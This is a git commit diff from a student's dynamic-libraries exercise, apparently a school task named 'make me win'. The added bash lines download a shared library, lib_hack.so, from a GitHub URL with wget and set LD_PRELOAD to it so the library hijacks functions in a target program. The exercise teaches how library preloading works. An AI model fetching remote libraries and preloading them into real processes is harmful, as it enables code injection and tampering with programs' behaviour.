28b333ae11f495498a4e5ce901775f54cbf29e8a
LIFALAKHE MASHABA <lifalakhe.lv@gmail.com>
2023-12-11 14:41:30 -0800

    make me win after hacking

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-wget -P
+wget -P .. https://raw.githubusercontent.com/lifalakhev/alx-low_level_programming/master/0x18-dynamic_libraries/lib_hack.so
+export LD_PRELOAD="$PWD/../lib_hack.so"
